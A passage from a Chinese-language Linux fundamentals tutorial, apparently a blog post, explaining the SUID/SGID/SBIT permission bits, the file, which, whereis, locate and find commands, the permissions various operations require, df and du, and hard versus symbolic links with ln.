class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">4  SUID</span><br><span class="line">2  SGID</span><br><span class="line">1  SBIT</span><br><span class="line">chmod 4775 test1 #加上SUID</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">drwsrwxr-x</span></span><br><span class="line">chmod 7666 test2 #加上三种</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">drwSrwSrwT</span></span><br><span class="line">chmod 4666 test3 </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">drwSrw-rw-</span></span><br><span class="line">chmod 6666 test4</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">drwSrwSrw-</span></span><br><span class="line">chmod 1666 test5</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">drw-rw-rwT</span></span><br><span class="line">chmod 1766 test5</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">drwxrw-rwT</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">符号法</span></span><br><span class="line">u+s #SUID</span><br><span class="line">g+s #SGID</span><br><span class="line">o+t #SBIT</span><br></pre></td></tr></table></figure></div><blockquote><p>从上面的案例可以看出，当user没有x时加上SUID会用S填充表示空，同理当group权限没有x时加SGID会用S填充表示空，而SBIT在others没有x时以T填充表示空</p></blockquote><h3 id="查看文件类型-file"><a href="#查看文件类型-file" class="headerlink" title="查看文件类型:file"></a>查看文件类型:file</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file 文件或目录路径</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">回显</span></span><br><span class="line">路径:格式类型信息(包括有没有使用到动态函数库等信息)  (这里的路径取决于你输入命令中的路径，不一定是绝对路径)</span><br></pre></td></tr></table></figure></div><h2 id="0x06-命令与文件的查询"><a href="#0x06-命令与文件的查询" class="headerlink" title="0x06 命令与文件的查询"></a>0x06 命令与文件的查询</h2><h3 id="脚本文件名查询"><a href="#脚本文件名查询" class="headerlink" title="脚本文件名查询"></a>脚本文件名查询</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">which [-a] command</span><br><span class="line">-a:列出所有同名命令</span><br></pre></td></tr></table></figure></div><h3 id="文件名查找"><a href="#文件名查找" class="headerlink" title="文件名查找"></a>文件名查找</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">whereis [options] 文件或目录名</span><br><span class="line">-b:只找二进制文件</span><br><span class="line">-m:只找在说明文件manual路径下的文件</span><br><span class="line">-s:只找source源文件</span><br><span class="line">-u:除以上三种外的其他特殊文件</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">locate [options] keyword</span><br><span class="line">-i:忽略大小写差异</span><br><span class="line">-r:后面可接正则</span><br></pre></td></tr></table></figure></div><h4 id="find命令–磁盘中查找，时间较长，功能强大"><a href="#find命令–磁盘中查找，时间较长，功能强大" class="headerlink" title="find命令–磁盘中查找，时间较长，功能强大"></a>find命令–磁盘中查找，时间较长，功能强大</h4><p><a class="link"   href="https://wangchujiang.com/linux-command/c/find.html" >https://wangchujiang.com/linux-command/c/find.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>时间相关参数</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">find [PATH] [option] [action]</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">可加与时间相关参数，下面以-mtime为例</span></span><br><span class="line">-mtime n : n天之前的“一天内”被更改文件</span><br><span class="line">-mtime +n : n天之前(不含n本身，包括往前所有时间)被更改文件</span><br><span class="line">-mtime -n : n天之内(含n本身)被更改文件</span><br><span class="line">-newer 文件: 列出比该文件更新的文件</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">列出过去24小时内被修改文件</span></span><br><span class="line">find / -mtime 0</span><br></pre></td></tr></table></figure></div><p>用户、用户组相关参数</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-uid n </span><br><span class="line">-gid n</span><br><span class="line">-user name</span><br><span class="line">-group name</span><br><span class="line">-nouser   :找出文件所有者不在/etc/passwd中的</span><br><span class="line">-nogroup  :找出文件所有用户组不在/etc/passwd中的</span><br></pre></td></tr></table></figure></div><blockquote><p>找到不属于系统任何人的文件，可能是曾经下载用于编译软件的源码</p></blockquote><p>文件权限、名称相关参数</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-name filename</span><br><span class="line">-size [+-]SIZE :找比SIZE大(+)或小(-)的,c表示byte，k表示KB，e.g. -size +50k</span><br><span class="line">-type TYPE: 正规文件(f)、设备文件(b,c)、目录(d)、连接文件(l)、socket(s)、FIFO(p)等</span><br><span class="line">-perm 权限分数</span><br><span class="line">-perm -mode :找出权限分数比mode大的文件   e.g. -perm -0744</span><br><span class="line">-perm +mode :找出权限中包含任一mode权限的</span><br></pre></td></tr></table></figure></div><p>其他参数</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-exec command &#123;&#125;\;  :后接command处理查询结果，但不支持命令别名alias</span><br><span class="line">-print : 打印，这是默认操作</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">范例</span></span><br><span class="line">find / -perm +7000 -exec ls -l &#123;&#125;\;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将含有隐藏权限的文件找出并以<span class="built_in">ls</span> -l方式列出来</span></span><br></pre></td></tr></table></figure></div><blockquote><p>find的结果被放入’{}’中，命令以’;‘为结束标志,因为’;’在bash下有特殊意义要转义</p></blockquote><h2 id="0x07-权限与命令间关系"><a href="#0x07-权限与命令间关系" class="headerlink" title="0x07 权限与命令间关系"></a>0x07 权限与命令间关系</h2><h3 id="用户可进入目录成为可工作目录"><a href="#用户可进入目录成为可工作目录" class="headerlink" title="用户可进入目录成为可工作目录"></a>用户可进入目录成为可工作目录</h3><ul><li>可使用命令：cd等切换工作目录</li><li>目录所需权限：至少是x</li><li>额外需求：若想执行ls查阅目录内文件名，对目录还要r权限</li></ul><h3 id="用户读取目录内内某一文件"><a href="#用户读取目录内内某一文件" class="headerlink" title="用户读取目录内内某一文件"></a>用户读取目录内内某一文件</h3><ul><li>可使用命令：cat、more、less等</li><li>目录所需权限：至少是x</li><li>文件所需权限：至少是r</li></ul><h3 id="用户修改某一文件"><a href="#用户修改某一文件" class="headerlink" title="用户修改某一文件"></a>用户修改某一文件</h3><ul><li>目录所需权限：至少是x</li><li>文件所需权限：至少是r、w</li></ul><h3 id="用户创建一个文件"><a href="#用户创建一个文件" class="headerlink" title="用户创建一个文件"></a>用户创建一个文件</h3><ul><li>目录所需：至少是w、x</li></ul><h4 id="用户进入某目录并执行该目录下某命令"><a href="#用户进入某目录并执行该目录下某命令" class="headerlink" title="用户进入某目录并执行该目录下某命令"></a>用户进入某目录并执行该目录下某命令</h4><ul><li>目录所需权限：至少是x</li><li>文件所需权限：至少是x</li></ul><h3 id="范例"><a href="#范例" class="headerlink" title="范例"></a>范例</h3><p>用户能执行以下命令</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /dir1/file1  /dir2</span><br></pre></td></tr></table></figure></div><ul><li>dir1目录:至少有x</li><li>file1文件:至少有r</li><li>dir2目录:至少有w、x</li></ul><h1 id="文件系统的简单操作"><a href="#文件系统的简单操作" class="headerlink" title="文件系统的简单操作"></a>文件系统的简单操作</h1><h2 id="查看磁盘与目录的容量"><a href="#查看磁盘与目录的容量" class="headerlink" title="查看磁盘与目录的容量"></a>查看磁盘与目录的容量</h2><h3 id="df"><a href="#df" class="headerlink" title="df"></a>df</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">df [options] [目录名/文件名]</span><br><span class="line">-a: 列出所有，包括特有的/proc</span><br><span class="line">-k: 以KB单位显示</span><br><span class="line">-m: 以MB单位</span><br><span class="line">-h: 自动加上单位(如显示12K)</span><br><span class="line">-H: 使用M=1000K的换算</span><br><span class="line">-T: 连同该分区的文件系统名称也列出</span><br><span class="line">-i: 以inode数量显示</span><br></pre></td></tr></table></figure></div><blockquote><ul><li>inode:一个文件占用一个inode，inode记录文件的属性,也记录此文件的数据所在的block号码</li><li>block:记录文件内容，若文件太大，会占用多个block</li><li>super block: 记录此文件系统的整体信息</li></ul></blockquote><h3 id="du"><a href="#du" class="headerlink" title="du"></a>du</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">du [options] 文件或目录名</span><br><span class="line">-a: 所有</span><br><span class="line">-h: 自动加上单位</span><br><span class="line">-s: 列出总量</span><br><span class="line">-S: 列出总量，但不包括子目录</span><br><span class="line">-k: kb</span><br><span class="line">-m: mb</span><br></pre></td></tr></table></figure></div><h2 id="连接文件"><a href="#连接文件" class="headerlink" title="连接文件"></a>连接文件</h2><h3 id="ln"><a href="#ln" class="headerlink" title="ln"></a>ln</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ln [options] 源文件 目标文件</span><br><span class="line">-s: 不加-s就是硬连接，加-s就是symbolic link</span><br><span class="line">-f: 如果目标文件存在，主动将目标文件直接删除任何再创建</span><br></pre></td></tr></table></figure></div><blockquote><ul><li><p>硬连接：使得两个文件连接到同一个inode,二者除文件名以外一摸一样</p><ul><li>不能跨文件系统、不能连接到目录</li></ul></li><li><p>symbolic link: 符号连接，快捷方式</p><ul><li>删除源文件，会导致目标文件打开不了</li></ul></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> foundation </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
